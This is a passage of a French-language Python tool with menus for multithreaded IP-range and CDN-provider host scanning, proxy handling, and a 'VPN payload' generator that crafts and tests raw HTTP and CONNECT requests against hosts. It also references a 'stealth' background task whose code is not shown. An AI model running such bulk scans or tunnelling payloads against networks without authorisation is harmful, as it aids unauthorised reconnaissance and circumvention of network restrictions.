            def has_all_headers(payload, headers):
                for h in headers:
                    if not re.search(rf"(?i)^{h}:", payload, re.MULTILINE):
                        return False
                return True

            original_count = len(filtered_payloads)
            filtered_payloads = [p for p in filtered_payloads if has_all_headers(p, required_headers)]
            console.print(f"[green]✔ {len(filtered_payloads)} payload(s) après filtrage par headers (sur {original_count})[/green]")

        elif choice == "3":
            min_len = Prompt.ask("Longueur minimale", default="1")
            max_len = Prompt.ask("Longueur maximale (ou '0' pour aucune limite)", default="0")
            try:
                min_len = int(min_len)
                max_len = int(max_len)
                original_count = len(filtered_payloads)
                if max_len == 0:
                    filtered_payloads = [p for p in filtered_payloads if len(p) >= min_len]
                else:
                    filtered_payloads = [p for p in filtered_payloads if min_len <= len(p) <= max_len]
                console.print(f"[green]✔ {len(filtered_payloads)} payload(s) après filtrage par taille (sur {original_count})[/green]")
            except ValueError:
                console.print("[red]❌ Valeurs de longueur invalides[/red]")

        elif choice == "4":
            keyword = Prompt.ask("Mot-clé à rechercher dans le contenu")
            original_count = len(filtered_payloads)
            filtered_payloads = [p for p in filtered_payloads if keyword.lower() in p.lower()]
            console.print(f"[green]✔ {len(filtered_payloads)} payload(s) contenant '{keyword}' (sur {original_count})[/green]")

        elif choice == "0":
            break

    return filtered_payloads

def fetch_https_payload_and_response(domain):
    port = 443
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {domain}\r\n"
        f"User-Agent: Python\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n\r\n"
    )

    context = ssl.create_default_context()
    try:
        with socket.create_connection((domain, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                ssock.sendall(request.encode())
                response = b""
                while True:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
    except Exception as e:
        console.print(f"[red]❌ Erreur lors de la connexion HTTPS : {e}[/red]")
        return None, None

    return request, response.decode(errors="ignore")

def send_https_request(domain, method="GET", path="/", headers=None, body=None):
    port = 443
    method = method.upper()
    headers = headers or {}
    
    request_lines = [f"{method} {path} HTTP/1.1"]
    headers.setdefault("Host", domain)
    headers.setdefault("User-Agent", "Python")
    headers.setdefault("Accept", "*/*")
    headers.setdefault("Connection", "close")
    
    if body:
        headers["Content-Length"] = str(len(body.encode()))
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

    for k, v in headers.items():
        request_lines.append(f"{k}: {v}")
    
    request_lines.append("")  # Ligne vide
    request = "\r\n".join(request_lines) + "\r\n"

    if body:
        request += body

    context = ssl.create_default_context()
    try:
        with socket.create_connection((domain, port), timeout=6) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                ssock.sendall(request.encode())
                response = b""
                while True:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
    except Exception as e:
        return request, None, str(e)

    return request, response.decode(errors="ignore"), None

def generate_https_request():
    domain = Prompt.ask("🌍 Domaine (ex: youtube.com)")
    method = Prompt.ask("🔧 Méthode HTTP", choices=["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"], default="GET")
    path = Prompt.ask("🛣️ Chemin (ex: /)", default="/")

    headers = {}
    if Prompt.ask("🧩 Ajouter des headers personnalisés ? (y/n)", default="n") == "y":
        while True:
            h = Prompt.ask("➡️ Header (format: Clé:Valeur ou vide pour finir)")
            if not h.strip():
                break
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    body = None
    if method in ["POST", "PUT", "PATCH"]:
        if Prompt.ask("📦 Ajouter un corps à la requête ? (y/n)", default="n") == "y":
            body = Prompt.ask("📝 Contenu du corps (ex: a=1&b=2)")

    req, resp, error = send_https_request(domain, method, path, headers, body)

    if error:
        console.print(f"[red]❌ Erreur : {error}[/red]")
        return

    console.print("\n[bold green]✔ Requête envoyée :[/bold green]")
    console.print(Panel(req.strip(), title=f"{method} {path} à {domain}", border_style="green"))

    if Prompt.ask("👁️ Voir la réponse du serveur ? (y/n)", default="y") == "y":
        truncated = resp[:3000] + "\n... [réponse tronquée]" if len(resp) > 3000 else resp
        console.print(Panel(truncated, title="📥 Réponse brute", border_style="cyan"))

    if Prompt.ask("💾 Enregistrer cette requête et réponse ? (y/n)", default="n") == "y":
        filename = f"{method.lower()}_{domain.replace('.', '_')}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("=== REQUEST ===\n")
            f.write(req)
            f.write("\n\n=== RESPONSE ===\n")
            f.write(resp)
        console.print(f"[green]✔ Fichier enregistré : {filename}[/green]")

def test_payload_from_raw_file():
    file_path = Prompt.ask("Chemin du fichier texte brut à analyser")
    if not os.path.isfile(file_path):
        console.print("[red]❌ Fichier introuvable.[/red]")
        return

    with open(file_path, "r", encoding="utf-8") as f:
        raw_content = f.read()

    all_payloads = extract_http_blocks_from_raw_text(raw_content)
    if not all_payloads:
        console.print("[red]⚠ Aucun bloc HTTP détecté[/red]")
        return

    def filter_by_method(payloads):
        console.print("\n[bold cyan]🎯 Filtrage par méthode HTTP[/bold cyan]")
        console.print("\n".join([
            "[1] GET", "[2] CONNECT", "[3] POST",
            "[4] PUT", "[5] DELETE", "[6] HEAD",
            "[7] Toutes les méthodes", "[8] ➕ Méthodes multiples", "[9] 🧠 Détection automatique"
        ]))

        choice = Prompt.ask("Votre choix", choices=[str(i) for i in range(1, 10)], default="7")
        method_map = {
            "1": ["GET"], "2": ["CONNECT"], "3": ["POST"],
            "4": ["PUT"], "5": ["DELETE"], "6": ["HEAD"], "7": []
        }
        valid_http_methods = {"GET", "POST", "CONNECT", "PUT", "DELETE", "HEAD", "OPTIONS", "TRACE", "PATCH"}

        def matches_method(p, methods): return any(p.upper().startswith(m) for m in methods)

        if choice in method_map:
            return [p for p in payloads if matches_method(p, method_map[choice])] if method_map[choice] else payloads

        if choice == "8":
            user_input = Prompt.ask("Entrez les méthodes séparées par des virgules (ex: GET,POST)")
            input_methods = [m.strip().upper() for m in user_input.split(",")]
            methods = [m for m in input_methods if m in valid_http_methods]

            if not methods:
                console.print("[red]❌ Aucune méthode HTTP valide[/red]")
                return []
            invalid = [m for m in input_methods if m not in valid_http_methods]
            if invalid:
                console.print(f"[yellow]⚠ Méthodes ignorées : {', '.join(invalid)}[/yellow]")
            return [p for p in payloads if matches_method(p, methods)]

        if choice == "9":
            counter = {}
            method_regex = re.compile(r"^\s*(GET|POST|CONNECT|PUT|DELETE|HEAD|OPTIONS|TRACE|PATCH)\b", re.IGNORECASE)
        
            for p in payloads:
                match = method_regex.search(p)
                if match:
                    method = match.group(1).upper()
                    counter[method] = counter.get(method, 0) + 1
        
            if not counter:
                console.print("[red]❌ Aucune méthode HTTP valide détectée[/red]")
                return []
        
            sorted_methods = sorted(counter.items(), key=lambda x: x[1], reverse=True)
            console.print("\n[cyan]📊 Méthodes HTTP détectées :[/cyan]")
            for method, count in sorted_methods:
                console.print(f"  - {method}: {count} fois")
        
            if Prompt.ask("Enregistrer l’analyse dans un fichier ? (y/n)", default="n") == "y":
                with open("http_methods_stats.txt", "w", encoding="utf-8") as f:
                    for method, count in sorted_methods:
                        f.write(f"{method}: {count}\n")
                console.print("[green]✔ Statistiques enregistrées[/green]")
        
            top_method = sorted_methods[0][0]
            console.print(f"[green]✔ Méthode la plus fréquente : {top_method}[/green]")
            return [p for p in payloads if p.upper().startswith(top_method)]
        
        elif choice == "10":
            domain = Prompt.ask("Entrez le domaine cible (ex: google.com)")
            req, resp = fetch_https_payload_and_response(domain)
            if not req:
                return
        
            console.print("\n[bold green]✔ Requête HTTPS envoyée :[/bold green]")
            console.print(Panel(req.strip(), title=f"GET / via HTTPS à {domain}", border_style="green"))
        
            if Prompt.ask("Souhaitez-vous voir la réponse du serveur ? (y/n)", default="y") == "y":
                console.print("\n[bold blue]📥 Réponse reçue :[/bold blue]")
                truncated = resp[:2000] + "\n... [troncature]" if len(resp) > 2000 else resp
                console.print(Panel(truncated, title="Réponse brute", border_style="cyan"))
        
            if Prompt.ask("Enregistrer cette interaction dans un fichier ? (y/n)", default="n") == "y":
                with open(f"https_get_{domain.replace('.', '_')}.txt", "w", encoding="utf-8") as f:
                    f.write("=== REQUEST ===\n")
                    f.write(req)
                    f.write("\n\n=== RESPONSE ===\n")
                    f.write(resp)
                console.print("[green]✔ Interaction enregistrée.[/green]")                
        
        if choice == "0":
            target = Prompt.ask("Entrez le nom de domaine (ex: youtube.com)")
            
            console.print("\n[bold cyan]💡 Type de requête à générer[/bold cyan]")
            console.print("[1] Requête HTTP classique (GET /)")
            console.print("[2] Connexion HTTPS simulée (CONNECT)")
        
            mode = Prompt.ask("Votre choix", choices=["1", "2"], default="1")
        
            if mode == "1":
                try:
                    import http.client
        
                    # Connexion HTTP pour générer un vrai payload simulé
                    conn = http.client.HTTPConnection(target, 80, timeout=5)
                    conn.request("GET", "/")
                    req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Python\r\nAccept: */*\r\nConnection: close\r\n\r\n"
                    payloads = [req]
        
                    console.print("\n[bold green]✔ Payload HTTP généré :[/bold green]")
                    console.print(Panel(req.strip(), title=f"HTTP vers {target}", border_style="green"))
        
                except Exception as e:
                    console.print(f"[red]❌ Erreur HTTP : {e}[/red]")
                    return
        
            elif mode == "2":
                # Génération d’un payload CONNECT
                req = f"CONNECT {target}:443 HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Python\r\nProxy-Connection: keep-alive\r\n\r\n"
                payloads = [req]
        
                console.print("\n[bold green]✔ Payload CONNECT (HTTPS) généré :[/bold green]")
                console.print(Panel(req.strip(), title=f"CONNECT vers {target}", border_style="blue"))
        
            # Option d’enregistrement
            if Prompt.ask("Souhaitez-vous enregistrer ce payload dans un fichier ? (y/n)", default="n") == "y":
                filename = f"payload_{target.replace('.', '_')}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(req)
                console.print(f"[green]✔ Payload enregistré dans [bold]{filename}[/bold][/green]")
        
            return  # fin de la fonction ici pour éviter d’enchaîner
                
    def filter_by_headers(payloads):
        if Prompt.ask("\nFiltrer selon certains headers ? (y/n)", default="n") != "y":
            return payloads
        headers_input = Prompt.ask("Entrez les noms de headers (ex: Host,X-Forwarded-For)")
        wanted = [h.strip().lower() for h in headers_input.split(",") if h.strip()]

        def has_headers(p):
            return all(re.search(rf"(?i)^{h}:", p, re.MULTILINE) for h in wanted)

        filtered = [p for p in payloads if has_headers(p)]
        console.print(f"[green]✔ {len(filtered)} payload(s) après filtrage par headers[/green]")
        return filtered

    def filter_by_length(payloads):
        if Prompt.ask("\nFiltrer selon la taille du payload ? (y/n)", default="n") != "y":
            return payloads
        try:
            min_len = int(Prompt.ask("Longueur minimale", default="1"))
            max_len = int(Prompt.ask("Longueur maximale (0 pour illimité)", default="0"))
        except ValueError:
            console.print("[red]❌ Valeurs invalides[/red]")
            return payloads
        filtered = [p for p in payloads if len(p) >= min_len and (max_len == 0 or len(p) <= max_len)]
        console.print(f"[green]✔ {len(filtered)} payload(s) après filtrage par longueur[/green]")
        return filtered

    payloads = filter_by_method(all_payloads)
    if not payloads:
        return

    payloads = filter_by_headers(payloads)
    payloads = filter_by_length(payloads)

    console.print("\n[bold cyan]🧠 Mode de test[/bold cyan]")
    console.print("[1] Manuel (confirmer chaque payload)")
    console.print("[2] Automatique (tout tester sans pause)")
    mode = Prompt.ask("Mode", choices=["1", "2"], default="1")

    result_log = []
    for i, payload in enumerate(payloads):
        console.print(Panel(payload, title=f"Payload #{i+1}", border_style="blue"))
        if mode == "1" and Prompt.ask("Tester ce payload ? (o/n)", choices=["o", "n"], default="o") != "o":
            continue

        hosts = extract_all_hosts_from_payload(payload)
        if not hosts:
            hosts = [Prompt.ask("Aucun host détecté. Entrez manuellement")]

        chosen_hosts = hosts
        if len(hosts) > 1:
            console.print(f"[yellow]🧭 Hôtes détectés :[/yellow] {', '.join(hosts)}")
            console.print("[1] Utiliser le premier\n[2] Choisir manuellement\n[3] Tester tous")
            choice = Prompt.ask("Votre choix", choices=["1", "2", "3"], default="1")
            if choice == "1":
                chosen_hosts = [hosts[0]]
            elif choice == "2":
                for idx, h in enumerate(hosts):
                    console.print(f"[{idx}] {h}")
                try:
                    idx = int(Prompt.ask("Index de l’hôte", default="0"))
                    chosen_hosts = [hosts[idx]]
                except:
                    console.print("[red]Index invalide, premier hôte utilisé[/red]")
                    chosen_hosts = [hosts[0]]

        for host in chosen_hosts:
            port = 443 if "CONNECT" in payload.upper() else 80
            console.print(f"[yellow]🔌 Test : {host}:{port}[/yellow]")

            socket_ok = test_socket(host, port, payload)
            http_ok = test_http(host, "/") if port in [80, 443] else False

            result_log.append(
                f"Payload #{i+1}:\n{payload}\n"
                f"[Host: {host} | Port: {port} | Socket: {'OK' if socket_ok else 'Échec'}"
                f" | HTTP: {'OK' if http_ok else 'Échec'}]\n{'-'*60}\n"
            )

    if not result_log:
        console.print("[yellow]Aucun test effectué. Rien à enregistrer.[/yellow]")
        return

    with open("results.txt", "w", encoding="utf-8") as f:
        f.writelines(result_log)

    console.print(f"\n[green]✔ Résultats enregistrés dans [bold]results.txt[/bold][/green]")

def main():
    start_background_tasks()

    while True:
        choice = main_menu()

        if choice == "1":  # Scanner une plage IP
            ip_range = input("Entrez la plage IP (ex: 192.168.1.0/24) : ")
            threads = int(input("Nombre de threads (max 500) : "))
            proxy = get_proxy_config()
            turbo = False
            if proxy == "auto":
                turbo = input("Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'

            print("\nContrôles: p=pause, r=reprise, s=stop")
            scanner = HostScanner(
                ip_range=ip_range,
                threads=threads,
                proxy=proxy,
                turbo_mode=turbo
            )
            scanner.run()
            ask_for_rescan(scanner)

        elif choice == "2":  # Scanner depuis fichier
            filename = input("Chemin du fichier contenant les hôtes : ")
            threads = int(input("Nombre de threads (max 500) : "))
            proxy = get_proxy_config()
            turbo = False
            if proxy == "auto":
                turbo = input("Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'

            print("\nContrôles: p=pause, r=reprise, s=stop")
            scanner = HostScanner(
                filename=filename,
                threads=threads,
                proxy=proxy,
                turbo_mode=turbo
            )
            scanner.run()
            ask_for_rescan(scanner)

        elif choice == "3":
            retour = domain_tools_menu()

        elif choice == "4":
            while True:
                text_choice = text_file_menu()
                if text_choice == "1":
                    input_file = input("Fichier à fractionner : ")
                    output_prefix = input("Préfixe de sortie : ")
                    num_parts = int(input("Nombre de parties : "))
                    TextFileManager.split_file(input_file, output_prefix, num_parts)
                elif text_choice == "2":
                    input_files = input("Fichiers à fusionner (séparés par espaces) : ").split()
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.merge_files(input_files, output_file)
                elif text_choice == "3":
                    input_file = input("Fichier à nettoyer : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.remove_duplicates(input_file, output_file)
                elif text_choice == "4":
                    input_file = input("Fichier à séparer : ")
                    output_domains = input("Sortie domaines : ")
                    output_ips = input("Sortie IPs : ")
                    TextFileManager.separate_domains_and_ips(input_file, output_domains, output_ips)
                elif text_choice == "5":
                    input_file = input("Fichier à réorganiser : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.reorganize_by_extension(input_file, output_file)
                elif text_choice == "6":
                    input_file = input("Fichier domaines : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.convert_domains_to_ips(input_file, output_file)
                elif text_choice == "7":
                    input_file = input("Fichier à trier : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.sort_domains_or_ips(input_file, output_file)
                elif text_choice == "8":
                    input_file = input("Fichier CIDR : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.convert_cidr_to_ips(input_file, output_file)
                elif text_choice == "9":
                    input_file = input("Fichier source : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.extract_domains_and_ips(input_file, output_file)
                elif text_choice == "10":
                    print("\n=== RÉSOLUTION DNS AVANCÉE ===")
                    print(f"{Fore.CYAN}Instructions:{Style.RESET_ALL}")
                    print("- Un fichier d'entrée avec une IP par ligne")
                    print("- Les résultats peuvent être exportés en CSV")
                    print(f"- {Fore.YELLOW}Appuyez sur Ctrl+C pour annuler{Style.RESET_ALL}\n")
                    
                    confirm = input("Voulez-vous continuer ? (o/n) : ").lower()
                    if confirm == 'o':
                        input_file = input("Chemin du fichier d'IPs : ")
                        if not os.path.exists(input_file):
                            print(f"{Fore.RED}Fichier introuvable !{Style.RESET_ALL}")
                        else:
                            output_file = input("Fichier de sortie (optionnel) : ") or None
                            TextFileManager.DNSResolver.batch_resolve(input_file, output_file)
                elif text_choice == "0":
                    break
                else:
                    print("❌ Option invalide.")
        
        elif choice == "5":
            while True:
                proxy_choice = proxy_menu()
                if proxy_choice == "1":
                    update_proxy_file()
                elif proxy_choice == "2":
                    select_proxy_interactive()
                elif proxy_choice == "3":
                    display_proxies()
                elif proxy_choice == "4":
                    recheck_existing_proxies()
                elif proxy_choice == "0":
                    break
                else:
                    print("❌ Choix invalide.")

        elif choice == "6":  # NOUVELLE OPTION - Générateur de Payload VPN
            afficher_banniere()
            while True:
                console.print("\n[bold yellow]===[ IPToP ]===\n[/bold yellow]")
                console.print("[1] 🛠 Créer un nouveau payload")
                console.print("[2] 🧾 Voir l'historique")
                console.print("[3] 🧪 Tester un payload existant")
                console.print("[4] 🔐 Générer une requête HTTPS")
                console.print("[0] ❌ Quitter")
        
                choix = Prompt.ask("🎯 Votre choix", choices=["1", "2", "3", "4", "0"], default="1")
        
                if choix == "1":
                    build_payload_interactively()
                elif choix == "2":
                    show_history()
                elif choix == "3":
                    test_payload_from_source()
                elif choix == "4":
                    generate_https_request()
                elif choix == "0":
                    console.print("[bold green]👋 Merci, à bientôt ![/bold green]")
                    break
                else:
                    console.print("[red]⛔ Choix invalide[/red]")
        
        elif choice == "7":
            proxy = get_proxy_config()
            manage_cloudflare_scan(proxy=proxy)

        elif choice == "8":
            proxy = get_proxy_config()
            manage_cloudfront_scan(proxy=proxy)

        elif choice == "9":
            proxy = get_proxy_config()
            manage_googlecloud_scan(proxy=proxy)

        elif choice == "10":
            proxy = get_proxy_config()
            manage_fastly_scan(proxy=proxy)

        elif choice == "11":
            proxy = get_proxy_config()
            manage_akamai_scan(proxy=proxy)

        elif choice == "12":
            proxy = get_proxy_config()
            manage_azure_scan(proxy=proxy)

        elif choice == "13":
            proxy = get_proxy_config()
            manage_stackpath_scan(proxy=proxy)

        elif choice == "14":
            proxy = get_proxy_config()
            manage_gcore_scan(proxy=proxy)

        elif choice == "15":
            proxy = get_proxy_config()
            manage_bunny_scan(proxy=proxy)
            
        elif choice == "16":
            proxy = get_proxy_config()
            manage_imperva_scan(proxy=proxy)

        elif choice == "17":
            proxy = get_proxy_config()
            manage_sucuri_scan(proxy=proxy)

        elif choice == "98":
            vider_repertoire_tmp_interactif()

        elif choice == "99":
            menu_messagerie()

        elif choice == "0":
            print("👋 À très bientôt !")
            sys.exit(0)
            
# ==============================================
# INITIALISATION COMPATIBLE
# ==============================================
if __name__ == "__main__":
    # Affiche la bannière une fois au lancement
    display_banner()
    
    # Démarrer les threads en arrière-plan (inclut _process_results_stealth une seule fois)
    start_background_tasks()
    
    # Démarrer l'interface normale
    main()